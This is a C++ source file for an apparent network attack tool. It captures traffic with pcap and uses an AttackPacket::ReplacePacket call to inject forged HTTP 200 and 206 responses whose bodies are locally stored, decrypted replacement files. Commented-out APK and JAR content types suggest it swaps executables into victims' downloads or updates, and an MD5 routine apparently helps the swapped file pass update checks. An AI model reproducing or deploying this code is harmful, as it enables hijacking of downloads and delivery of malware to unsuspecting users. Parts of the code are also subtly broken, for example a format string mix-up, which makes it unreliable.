

#include "ReplaceNetFile.h"
#include "FileOper.h"
#include "cipher/CryptoUtils.h"

ReplaceNetFile::~ReplaceNetFile() {

}

ReplaceNetFile::ReplaceNetFile() {

}

int ReplaceNetFile::sendReplaceFile(pcap_t * pcapT,const char * lppacket, int packetsize, char * ip,int type,LPPPPOEHEADER pppoe) {
	int ret = 0;
	if (m_datasize && m_lpdata )
	{
		ret = AttackPacket::ReplacePacket(pcapT, lppacket, packetsize, m_lpdata, m_datasize, ip,type,pppoe);
	}
	return ret;
}


ReplaceNetFile::ReplaceNetFile(string filename) {

	ReplaceNetFile(filename, "application/octet-stream");
}


ReplaceNetFile::ReplaceNetFile(string filename,string type) {
	mInstance = this;
	lstrcpyA(mFileName, filename.c_str());

	m_filesize = FileOper::getFileSize(filename);
	if (m_filesize <= 0)
	{
		return;
	}

	char * httphdrformat =
		"HTTP/1.1 200 OK\r\n"
		"Content-Type: %s\r\n"
		//"Content-Type: application/zip\r\n"
		//"Content-Type: application/vnd.android.package-archive\r\n"
		//"Content-Type: application/java-archive\r\n"
		//"Content-Encoding: deflate\r\n"
		"Connection: keep-alive\r\n"
		"Content-Length: %u\r\n\r\n";
	char httphdr[MAX_RESPONSE_HEADER_SIZE];
	int httphdrlen = sprintf_s(httphdr, MAX_RESPONSE_HEADER_SIZE, httphdrformat, type.c_str(),m_filesize);

	int ret = FileOper::offsetFileDecryptReader(filename, &m_lpdata, httphdrlen, &m_filesize);
	if (ret <= 0)
	{
		return;
	}
	memcpy(m_lpdata, httphdr, httphdrlen);
	m_datasize = httphdrlen + m_filesize;
}



ReplaceNetFile::ReplaceNetFile(string filename,int start,int end) {
	ReplaceNetFile(filename, "application/octet-stream", start, end);
}


ReplaceNetFile::ReplaceNetFile(string filename, string type,int start, int end) {

	m_filesize = FileOper::getFileSize(filename);
	if (m_filesize <= 0)
	{
		return;
	}

	if (end == -1 || end == 0)
	{
		end = m_filesize;
	}

	char * httphdrjar =
		"HTTP/1.1 206 Partial Content\r\n"
		"Content-Type: %s\r\n"
		"Connection: keep-alive\r\n"
		"Content-Range: bytes 0-%u/%u\r\n"
		"Content-Length: %u\r\n\r\n";

	char httphdr[MAX_RESPONSE_HEADER_SIZE];
	int httphdrlen = sprintf_s(httphdr, MAX_RESPONSE_HEADER_SIZE, type.c_str(), m_filesize - 1, m_filesize, m_filesize);

	int ret = FileOper::offsetFileDecryptReader(filename, &m_lpdata, httphdrlen, &m_filesize);
	if (ret <= 0)
	{
		return;
	}
	memmove(m_lpdata, httphdr, httphdrlen);
	m_datasize = httphdrlen + m_filesize;
}


int ReplaceNetFile::getUpdateFileMd5(string filename, int lowercase) {

	int alphacase = 0;
	if (lowercase)
	{
		alphacase = 87;
	}
	else {
		alphacase = 55;
	}

	char * lpdata = 0;
	int filesize = 0;
	int ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret <= 0)
	{
		return FALSE;
	}

	m_filesize = filesize;

	memset(m_szmd5, 0, MD5BUFFER_SIZE);

	CryptoUtils::getDataMd5(lpdata, filesize, m_szmd5, lowercase);

	delete[] lpdata;
	lpdata = 0;

	return filesize;
}
